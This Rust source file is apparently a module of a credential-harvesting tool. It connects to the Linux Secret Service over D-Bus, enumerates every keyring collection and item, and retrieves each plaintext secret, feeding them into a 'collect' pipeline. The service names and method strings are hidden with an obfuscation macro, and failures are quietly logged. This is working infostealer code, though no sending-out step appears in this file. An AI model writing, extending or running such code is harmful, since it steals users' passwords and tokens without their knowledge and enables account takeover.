use std::collections::HashMap;
use std::error::Error;
use zbus::blocking::Connection;
use zbus::zvariant::{ObjectPath, OwnedObjectPath, OwnedValue, Value};
use super::{CollectedData, CollectedItem, ItemKind};
use crate::errors::CollectError;
use glimmer_obfstr::obfs;

/// A single secret retrieved from the freedesktop Secret Service
#[derive(Debug)]
pub struct KeyringEntry {
    pub path: String,
    pub label: String,
    pub secret: Vec<u8>,
    pub content_type: String,
}

impl KeyringEntry {
    /// Return the secret as a string, masking everything after visible_chars
    pub fn masked_secret(&self, visible_chars: usize) -> String {
        let plain = String::from_utf8_lossy(&self.secret);
        if plain.len() <= visible_chars {
            // return plain.to_string();
            return obfs!("****").as_str().to_string();
        }
        let visible: String = plain.chars().take(visible_chars).collect();
        let hidden_count = plain.chars().count() - visible_chars;
        format!("{}{}", visible, "*".repeat(hidden_count))
    }
}

fn open_session(conn: &Connection) -> Result<OwnedObjectPath, Box<dyn Error>> {
    let reply = conn
        .call_method(
            Some(obfs!("org.freedesktop.secrets").as_str()),
            obfs!("/org/freedesktop/secrets").as_str(),
            Some(obfs!("org.freedesktop.Secret.Service").as_str()),
            obfs!("OpenSession").as_str(),
            &(obfs!("plain").as_str(), Value::from(obfs!("").as_str())),
        )?;

    let body = reply.body();
    // OpenSession returns (Variant, ObjectPath)
    let (_output, session): (OwnedValue, OwnedObjectPath) = body.deserialize()?;

    Ok(session)
}

fn get_collections(conn: &Connection) -> Result<Vec<OwnedObjectPath>, Box<dyn Error>> {

    let reply = conn
        .call_method(
            Some(obfs!("org.freedesktop.secrets").as_str()),
            obfs!("/org/freedesktop/secrets").as_str(),
            Some(obfs!("org.freedesktop.DBus.Properties").as_str()),
            obfs!("Get").as_str(),
            &(obfs!("org.freedesktop.Secret.Service").as_str(), obfs!("Collections").as_str()),
        )?;

    let variant: OwnedValue = reply.body().deserialize()?;
    // let paths: Vec<OwnedObjectPath> = variant.try_into()
    //     .map_err(|e: zbus::zvariant::Error| -> Box<dyn Error> {
    //         format!("failed to convert Collections: {}", e).into()
    // })?;

    let paths: Vec<OwnedObjectPath> = variant.try_into()
        .map_err(|e: zbus::zvariant::Error| -> Box<dyn Error> {
            e.into()
        })?;

    Ok(paths)
}

fn get_collection_items(
    conn: &Connection,
    collection: &OwnedObjectPath,
) -> Result<Vec<OwnedObjectPath>, Box<dyn Error>> {

    let reply = conn
        .call_method(
            Some(obfs!("org.freedesktop.secrets").as_str()),
            collection.as_str(),
            Some(obfs!("org.freedesktop.DBus.Properties").as_str()),
            obfs!("Get").as_str(),
            &(obfs!("org.freedesktop.Secret.Collection").as_str(), obfs!("Items").as_str()),
        )?;

    let body = reply.body();

    let variant: OwnedValue = body.deserialize()?;
    // let paths: Vec<OwnedObjectPath> = variant.try_into()
    //     .map_err(|e: zbus::zvariant::Error| -> Box<dyn Error> {
    //         format!("failed to convert Collections: {}", e).into()
    // })?;
    let paths: Vec<OwnedObjectPath> = variant.try_into()
        .map_err(|e: zbus::zvariant::Error| -> Box<dyn Error> {
            e.into()
    })?;

    Ok(paths)
}

fn get_item_label(
    conn: &Connection,
    item: &OwnedObjectPath,
) -> Result<String, CollectError> {
    let si = obfs!("org.freedesktop.Secret.Item");
    let label = obfs!("Label");
    let reply = conn
        .call_method(
            Some(obfs!("org.freedesktop.secrets").as_str()),
            item.as_str(),
            Some(obfs!("org.freedesktop.DBus.Properties").as_str()),
            obfs!("Get").as_str(),
            &(si.as_str(), label.as_str()),
        ).map_err(|_e| {
            crate::dbg_log!("get_item_label failed: {}", _e);
            CollectError::KeyringGetFailed
        })?;

    let body = reply.body();
    let variant: OwnedValue = body.deserialize()
        .map_err(|_e: zbus::Error| -> CollectError {
            crate::dbg_log!("deserialize failed: {}", _e);
            CollectError::KeyringGetFailed
        })?;
    // let label: String = variant.try_into()
    //     .map_err(|e: zbus::zvariant::Error| -> Box<dyn Error> {
    //         format!("failed to convert Label: {}", e).into()
    // })?;
    let label: String = variant.try_into()
        .map_err(|_e: zbus::zvariant::Error| -> CollectError {
            crate::dbg_log!("failed to convert label: {}", _e);
            CollectError::KeyringGetFailed
    })?;
    Ok(label)
}

fn get_secret(
    conn: &Connection,
    item: &OwnedObjectPath,
    session: &OwnedObjectPath,
) -> Result<(Vec<u8>, String), Box<dyn Error>> {
    // GetSecrets takes an array of item paths and a session path
    let items: Vec<ObjectPath> = vec![ObjectPath::try_from(item.as_str())?];
    let session_ref = ObjectPath::try_from(session.as_str())?;

    let reply = conn
        .call_method(
            Some(obfs!("org.freedesktop.secrets").as_str()),
            obfs!("/org/freedesktop/secrets").as_str(),
            Some(obfs!("org.freedesktop.Secret.Service").as_str()),
            obfs!("GetSecrets").as_str(),
            &(items, session_ref),
        )?;

    // GetSecrets returns Dict<ObjectPath, (ObjectPath, bytes, bytes, string)>
    let body = reply.body();
    let secrets: HashMap<OwnedObjectPath, (OwnedObjectPath, Vec<u8>, Vec<u8>, String)> =
        body.deserialize()?;

    let (_sess, _params, value, content_type) = secrets
        .into_values()
        .next()
        .ok_or(obfs!("no data").as_str())?;

    Ok((value, content_type))
}

pub fn collect() -> Vec<CollectedItem> {

    crate::dbg_log!("starting collection: keyring");
    let mut items = Vec::new();

    match dump_keyring() {
        Ok(entries) => {
            for entry in entries {
                items.push(CollectedItem {
                    kind: ItemKind::KeyringSecret,
                    data: CollectedData::Keyring {
                        path: entry.path,
                        label: entry.label,
                        secret: entry.secret,
                        content_type: entry.content_type,
                    }
                });
            }
        }
        Err(e) => {
            e.record();
        }
    }

    crate::dbg_log!("finished collection. keyring items: {}", items.len());
    items
}

/// Connect to the session bus, enumerate all secrets in the default
/// keyring, and return them as structured entries.
pub fn dump_keyring() -> Result<Vec<KeyringEntry>, CollectError> {
    let conn = Connection::session()
    .map_err(|_e| {
        crate::dbg_log!("failed to start dbus session: {}", _e);
        CollectError::Failed
    })?;

    let session_path = open_session(&conn)
    .map_err(|_e| {
        crate::dbg_log!("failed to open dbus connection: {}", _e);
        CollectError::Failed
    })?;

    // Get all collections
    let collections = get_collections(&conn)
    .map_err(|_e| {
        crate::dbg_log!("failed to get collections: {}", _e);
        CollectError::Failed
    })?;

    let mut entries = Vec::new();

    for collection in &collections {
        // Get item paths in this collection
        let items = get_collection_items(&conn, collection)
        .map_err(|_e| {
            crate::dbg_log!("failed getting items: {}", _e);
            CollectError::Failed
        })?;

        for item_path in &items {
            let label = get_item_label(&conn, item_path)
                .unwrap_or_else(|_| "unknown".to_string());

            // Retrieve the actual secret
            match get_secret(&conn, item_path, &session_path) {
                Ok((secret, content_type)) => {
                    entries.push(KeyringEntry {
                        path: item_path.to_string(),
                        label,
                        secret,
                        content_type,
                    });
                }
                Err(_e) => {
                    crate::dbg_log!("failed to get secret for {}: {}", item_path, _e);
                    CollectError::KeyringGetFailed.record();
                }
            }
        }
    }

    Ok(entries)
}

pub fn get_secret_by_label(label: &str) -> Result<Vec<u8>, CollectError> {
    let conn = Connection::session()
        .map_err(|_e| CollectError::KeyringGetFailed)?;

    let session_path = open_session(&conn)
        .map_err(|_e| CollectError::KeyringGetFailed)?;

    let collections = get_collections(&conn)
        .map_err(|_e| CollectError::KeyringGetFailed)?;

    for collection in &collections {
        let items = get_collection_items(&conn, collection)
            .map_err(|_e| CollectError::KeyringGetFailed)?;

        for item_path in &items {
            let item_label = get_item_label(&conn, item_path)
                .unwrap_or_default();

            if item_label == label {
                let (secret, _content_type) = get_secret(&conn, item_path, &session_path)
                    .map_err(|_e| CollectError::KeyringGetFailed)?;
                return Ok(secret);
            }
        }
    }

    Err(CollectError::NotAvailable)
}